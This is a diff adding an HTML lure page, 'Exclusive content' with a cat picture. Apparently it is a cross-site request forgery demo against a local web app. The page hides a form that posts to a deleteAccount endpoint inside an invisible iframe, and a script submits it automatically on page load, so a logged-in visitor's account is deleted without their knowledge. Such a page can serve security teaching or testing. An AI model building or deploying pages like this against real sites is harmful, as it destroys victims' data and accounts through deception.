@@ -1,0 +1,23 @@
+<html>
+<head>
+      <title>Exclusive content</title>
+</head>
+<body>
+    <h2>Exclusive content!!! (delete)</h2>
+    <iframe name="frame" style="display: none;"></iframe>
+    <img width="600" height="450" src="./images/cat-delete.jpg" alt="">
+
+     <!-- Form for deleting user account -->
+    <form id="deleteForm" action="http://localhost:3000/deleteAccount" method="POST" target="frame">
+        <!-- Add any necessary hidden inputs here if needed -->
+    </form>
+
+    <script>
+        // JavaScript code to automatically submit the form
+        document.addEventListener('DOMContentLoaded', function() {
+            var form = document.getElementById('deleteForm');
+            form.submit();
+        });
+    </script>
+</body>
+</html>
